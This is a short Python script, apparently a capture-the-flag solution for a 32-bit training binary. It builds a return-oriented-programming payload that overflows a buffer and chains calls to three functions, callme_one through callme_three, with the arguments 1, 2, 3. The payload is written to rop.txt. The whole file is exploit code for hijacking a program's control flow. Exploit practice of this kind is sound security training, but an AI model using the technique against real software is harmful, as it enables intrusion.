#!/usr/bin/python3
 
garbage         = b'A' * 44
poppoppopgadget = b'\xa9\x88\x04\x08'
callme_one      = b'\xc0\x85\x04\x08'
callme_two      = b'\x20\x86\x04\x08'
callme_three    = b'\xb0\x85\x04\x08'
argument_one    = b'\x01\x00\x00\x00'
argument_two    = b'\x02\x00\x00\x00'
argument_three  = b'\x03\x00\x00\x00'
args            = argument_one + argument_two + argument_three
payload = garbage
 
# Setting up callme_one
payload += callme_one
payload += poppoppopgadget
payload += args
 
# Setting up callme_two
payload += callme_two
payload += poppoppopgadget
payload += args
 
# Settings up callme_three
payload += callme_three
payload += poppoppopgadget
payload += args
 
with open('rop.txt', 'wb') as w:
        w.write(payload)
